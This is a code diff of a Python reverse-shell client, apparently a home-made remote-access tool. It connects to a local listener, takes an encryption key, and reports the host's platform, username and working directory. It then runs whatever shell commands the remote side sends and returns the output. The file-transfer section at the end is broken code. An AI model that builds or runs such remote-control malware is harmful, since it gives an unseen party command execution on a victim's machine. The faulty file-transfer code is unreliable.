@@ -1,49 +1,75 @@
-import socket, subprocess
+import os
+import socket
+from random import choice
+import subprocess
+import json
+import platform
 from cryptography.fernet import Fernet
 
-host, port = "127.0.0.1", 5567
+chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPWRSTUVWXYZ1234567890!@#$%^&*()"
 
-s = socket.socket()
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+host = "127.0.0.1"
+port = 34467
+
 s.connect((host, port))
 
-server_key = ''
+encryption = False
 
-action = ""
+def new_salt():
+    salt = ""
+    for x in range(15):
+        salt += choice(chars)
+    return salt
+
+def send_raw(content_type, Bytes_, salt=new_salt()):
+    seperator = "<|SEPERATE|>"
+    to_send = content_type + seperator + Bytes_.decode() + seperator + salt
+    to_send = to_send.encode()
+    if encryption:
+        to_send = Fernet(key).encrypt(to_send)
+    s.send(to_send)
+
+def recv_raw(BufferSize):
+    seperator = "<|SEPERATE|>".encode()
+    data = b""
+    while True:
+        data = s.recv(BufferSize)
+        if data: break
+    if encryption:
+        data = Fernet(key).decrypt(data)
+    splitted = data.decode().split(seperator.decode())
+    content_type = splitted[0]
+    Bytes_ = splitted[1].encode()
+    salt = splitted[2]
+    return {"content_type": content_type, "bytes": Bytes_}
+
+key = recv_raw(1024)["bytes"]
+send_raw("key_confirm", key)
+encryption = True
+sys_info = {}
+sys_info["platform"] = platform.platform()
+sys_info["architecture"] = platform.architecture()
+sys_info["username"] = os.getlogin()
+sys_info["current_dir"] = os.getcwd()
+send_raw("sys_info", json.dumps(sys_info).encode())
 while True:
-    data = s.recv(1024)
-    if data:
-        if data == b"{SERVER KEY}":
-            action = "{SERVER KEY}"
-        elif data == b"{ABORT}":
-            s.close()
-            break
-        elif data == b"{COMMAND}":
-            action = "{COMMAND}"
-        elif data == b"{FILE}":
-            action = "{file}"
-            continue
-        if action == "{SERVER KEY}":
-            server_key = data
-        if action == "{COMMAND}":
-            crypto = Fernet(server_key)
-            cmd = s.recv(1024)
-            decrypted_cmd = crypto.decrypt(cmd).decode()
-            output = subprocess.getoutput(decrypted_cmd)
-            encrypted_output = crypto.encrypt(output.encode())
-            s.send(encrypted_output)
-            action = ""
-        elif action == "{file}":
-            seperator = "<SEPERATOR>"
-            recived = data.decode()
-            splited = recived.split(seperator)
-            filename = splited[0]
-            filesize = splited[1]
-            client_path = splited[2]
-            file_size = int(filesize)
-            with open(client_path, "wb") as f:
-                while True:
-                    bytes_read = s.recv(1024 if file_size > 1024 else file_size)
-                    if bytes_read == b"{END OF FILE}": 
-                        break
-                    f.write(bytes_read)
-            action = ""
+    #listen for commands
+    data = recv_raw(1024)
+    if data["content_type"] == "abort":
+        s.close()
+        break
+    elif data["content_type"] == "command":
+        #run the command and send the output
+        cmd = data["bytes"].decode()
+        output = subprocess.getoutput(cmd)
+        if cmd[:3] == "cd ":
+            os.chdir(cmd[3:])
+        send_raw("command_output", output.encode())
+    elif data["content_type"] == "initiate file transfer":
+        splitted = data["bytes"].decode().split("|")
+        place_on = splitted[1]
+        size_ = splitted[2]
+        file_stuff = recv_raw(size_ + 1000)
+        print(recv_raw["bytes"])
